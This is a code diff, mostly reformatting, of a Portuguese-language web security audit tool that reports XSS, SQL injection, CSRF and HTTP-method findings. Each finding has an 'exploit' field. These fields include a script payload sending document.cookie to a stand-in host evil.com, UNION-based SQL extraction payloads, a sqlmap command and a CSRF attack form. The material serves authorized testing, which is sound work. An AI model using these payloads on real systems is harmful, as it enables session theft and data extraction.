+        findings.append(
+            Finding(
+                "high",
+                "xss",
+                "Entrada refletida sem sanitizacao",
+                xss_evidence,
+                "Use encoding de saida (HTML entities) e CSP para mitigar XSS refletido.",
+                f"# Payload basico:\n"
+                f'curl "{url}/?q=<script>alert(1)</script>"\n'
+                f"# Payload de exfiltracao:\n"
+                f"curl \"{url}/?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\"\n"
+                f"# Verifique se o navegador executa o script.",
+            )
+        )
 
     if sqli_databases:
-        findings.append(Finding(
-            "critical", "sqli", "Possivel injecao SQL (error-based)",
-            f"Banco detectado: {', '.join(sqli_databases)}",
-            "Use queries parametrizadas/prepared statements e validacao de entrada.",
-            f"# Payloads de deteccao:\n"
-            f"  curl \"{url}/?id=1'\"\n"
-            f"  curl \"{url}/?id=1' OR '1'='1\"\n"
-            f"  curl \"{url}/?id=1 UNION SELECT NULL--\"\n"
-            f"# Extracao de dados (MySQL):\n"
-            f"  curl \"{url}/?id=1' UNION SELECT table_name FROM information_schema.tables--\"\n"
-            f"# Ferramentas: sqlmap -u \"{url}/?id=1\" --dbs",
-        ))
+        findings.append(
+            Finding(
+                "critical",
+                "sqli",
+                "Possivel injecao SQL (error-based)",
+                f"Banco detectado: {', '.join(sqli_databases)}",
+                "Use queries parametrizadas/prepared statements e validacao de entrada.",
+                f"# Payloads de deteccao:\n"
+                f'  curl "{url}/?id=1\'"\n'
+                f"  curl \"{url}/?id=1' OR '1'='1\"\n"
+                f'  curl "{url}/?id=1 UNION SELECT NULL--"\n'
+                f"# Extracao de dados (MySQL):\n"
+                f'  curl "{url}/?id=1\' UNION SELECT table_name FROM information_schema.tables--"\n'
+                f'# Ferramentas: sqlmap -u "{url}/?id=1" --dbs',
+            )
+        )
 
     missing_csrf = parser.forms_missing_csrf
     if missing_csrf > 0:
-        findings.append(Finding(
-            "medium", "csrf", "Formulario sem token CSRF",
-            f"{missing_csrf} formulario(s) POST sem campo CSRF hidden.",
-            "Adicione tokens CSRF em todos os formularios que modificam estado.",
-            f"# Inspecione forms no browser (DevTools > Elements)\n"
-            f"# Procure por <input type=\"hidden\" name=\"csrf\" ou similar>\n"
-            f"# CSRF explora via formulário malicioso:\n"
-            f"  <form method=\"POST\" action=\"{url}/endpoint\">\n"
-            f"    <input type=\"hidden\" name=\"param\" value=\"malicious\">\n"
-            f"    <input type=\"submit\">\n"
-            f"  </form>",
-        ))
+        findings.append(
+            Finding(
+                "medium",
+                "csrf",
+                "Formulario sem token CSRF",
+                f"{missing_csrf} formulario(s) POST sem campo CSRF hidden.",
+                "Adicione tokens CSRF em todos os formularios que modificam estado.",
+                f"# Inspecione forms no browser (DevTools > Elements)\n"
+                f'# Procure por <input type="hidden" name="csrf" ou similar>\n'
+                f"# CSRF explora via formulário malicioso:\n"
+                f'  <form method="POST" action="{url}/endpoint">\n'
+                f'    <input type="hidden" name="param" value="malicious">\n'
+                f'    <input type="submit">\n'
+                f"  </form>",
+            )
+        )
 
     findings.extend(analyze_hidden_fields(parser.hidden_fields))
 
@@ -1385,20 +1498,29 @@ def build_findings(
                 exploit_cmd += " -d 'test=1'"
             elif mr.method == "DELETE":
                 exploit_cmd += "\n# Cuidado: pode deletar dados reais em producao!"
-            findings.append(Finding(
-                severity, "methods", f"Metodo {mr.method} aceito",
-                f"{mr.status} {mr.url}",
-                recommendation,
-                exploit_cmd,
-            ))
+            findings.append(
+                Finding(
+                    severity,
+                    "methods",
+                    f"Metodo {mr.method} aceito",
+                    f"{mr.status} {mr.url}",
+                    recommendation,
+                    exploit_cmd,
+                )
+            )
 
         medium_methods = [mr for mr in method_results if mr.status in {200, 201, 204} and mr.method == "PATCH"]
-        findings.extend(Finding(
-                "medium", "methods", "Metodo PATCH aceito",
+        findings.extend(
+            Finding(
+                "medium",
+                "methods",
+                "Metodo PATCH aceito",
                 f"{mr.status} {mr.url}",
                 "Verifique autenticacao/autorizacao e restrinja metodos nao utilizados.",
                 f"curl -X PATCH {mr.url} -d 'field=newvalue'",
-            ) for mr in medium_methods)
+            )
+            for mr in medium_methods
+        )
 
     return findings
 
@@ -1406,7 +1528,6 @@ def build_findings(
 def risk_score(findings: list[Finding]) -> int:
     """Calcula score de risco somando pesos das severidades."""
     return sum(RISK_WEIGHTS.get(finding.severity, 0) for finding in findings)
-
 
 
 async def run_audit(
@@ -1469,6 +1590,7 @@ async def run_audit(
                 logger.info("Testando XSS reflection e SQLi error-based em paralelo...")
             if test_methods and probes:
                 logger.info("Testando metodos HTTP...")
+
             async def _safe_xss() -> tuple[bool, str]:
                 try:
                     return await check_xss_reflection(client, target, timeout, inject_params=inject_params)
@@ -1531,7 +1653,10 @@ async def run_audit(
         if login_url:
             logger.info("Testando Session Fixation...")
             sf_vulnerable, sf_details = await check_session_fixation(
-                client, target, login_url, timeout=timeout,
+                client,
+                target,
+                login_url,
+                timeout=timeout,
             )
             session_fixation = sf_vulnerable
             if sf_vulnerable:
@@ -1540,10 +1665,19 @@ async def run_audit(
                 logger.info("Session Fixation: %s", sf_details)
 
     findings = build_findings(
-        target, status, headers, parser, methods, probes, tls_subject,
-        tls_versions=tls_versions, xss_reflected=xss_reflected,
-        xss_evidence=xss_evidence, sqli_databases=sqli_databases,
-        raw_headers=raw_headers, method_results=method_results,
+        target,
+        status,
+        headers,
+        parser,
+        methods,
+        probes,
+        tls_subject,
+        tls_versions=tls_versions,
+        xss_reflected=xss_reflected,
+        xss_evidence=xss_evidence,
+        sqli_databases=sqli_databases,
+        raw_headers=raw_headers,
+        method_results=method_results,
         body_text=text,
     )
     findings.extend(js_inline_findings)
@@ -1579,7 +1713,9 @@ def print_result(result: AuditResult) -> None:
     print()
     print(color("Resumo", Cyber.CYAN, Cyber.BOLD))
     print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} URL: {color(result.final_url, Cyber.WHITE, Cyber.BOLD)}")
-    print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Status: {color(str(result.status), status_color(result.status), Cyber.BOLD)} | Score: {color(str(result.risk_score), Cyber.YELLOW, Cyber.BOLD)} | Tempo: {color(f"{result.elapsed:.2f}s", Cyber.YELLOW)}")
+    print(
+        f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Status: {color(str(result.status), status_color(result.status), Cyber.BOLD)} | Score: {color(str(result.risk_score), Cyber.YELLOW, Cyber.BOLD)} | Tempo: {color(f'{result.elapsed:.2f}s', Cyber.YELLOW)}"
+    )
     if result.title:
         print(f"{color('[T]', Cyber.MAGENTA, Cyber.BOLD)} Title: {color(result.title, Cyber.WHITE)}")
     if result.tls_subject:
@@ -1593,7 +1729,9 @@ def print_result(result: AuditResult) -> None:
         print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} TLS versions: {tls_status}")
     if result.allowed_methods:
         print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Metodos: {color(', '.join(result.allowed_methods), Cyber.WHITE)}")
-    print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Forms: {color(str(result.forms), Cyber.WHITE)} | Password inputs: {color(str(result.password_inputs), Cyber.WHITE)}")
+    print(
+        f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Forms: {color(str(result.forms), Cyber.WHITE)} | Password inputs: {color(str(result.password_inputs), Cyber.WHITE)}"
+    )
     if result.xss_reflected:
         print(f"{color('[!]', Cyber.RED, Cyber.BOLD)} XSS refletido: {color('SIM', Cyber.RED, Cyber.BOLD)}")
     if result.sqli_errors:
@@ -1640,9 +1778,7 @@ def _save_audit_output(path: str, result: AuditResult, quiet: bool = False) -> N
 
 def build_parser() -> argparse.ArgumentParser:
     """Constroi parser de argumentos da linha de comandos."""
-    parser = argparse.ArgumentParser(
-        description="Auditoria web red/blue para laboratorios e alvos autorizados."
-    )
+    parser = argparse.ArgumentParser(description="Auditoria web red/blue para laboratorios e alvos autorizados.")
     add_common_args(parser)
     parser.add_argument("url", nargs="?", help="URL alvo. Ex: https://example.com")
     parser.add_argument("-l", "--list", dest="target_list", help="Arquivo com URLs alvo (uma por linha).")
@@ -1682,8 +1818,14 @@ async def _run_single(url: str, args: argparse.Namespace, quiet: bool = False) -
     if getattr(args, "params", None):
         inject_params = [p.strip() for p in args.params.split(",") if p.strip()]
     result = await run_audit(
-        url, args.timeout, args.user_agent, args.concurrency, args.deep,
-        proxy=args.proxy, verify=getattr(args, "verify", False), requests_per_second=args.delay,
+        url,
+        args.timeout,
+        args.user_agent,
+        args.concurrency,
+        args.deep,
+        proxy=args.proxy,
+        verify=getattr(args, "verify", False),
+        requests_per_second=args.delay,
         test_vulns=args.test_vulns,
         test_methods=getattr(args, "test_methods", False),
         auth=getattr(args, "auth", None),
@@ -1753,8 +1895,9 @@ async def _async_run_once(args: argparse.Namespace) -> int:
         else:
             consolidated = [asdict(r) for r in all_results]
             csv_rows = [f for r in all_results for f in asdict(r)["findings"]]
-            write_output(args.output, consolidated, quiet=quiet, csv_rows=csv_rows,
-                         fieldnames=["severity", "category", "item", "evidence", "recommendation", "exploit"])
+            write_output(
+                args.output, consolidated, quiet=quiet, csv_rows=csv_rows, fieldnames=["severity", "category", "item", "evidence", "recommendation", "exploit"]
+            )
     return 0
 
 
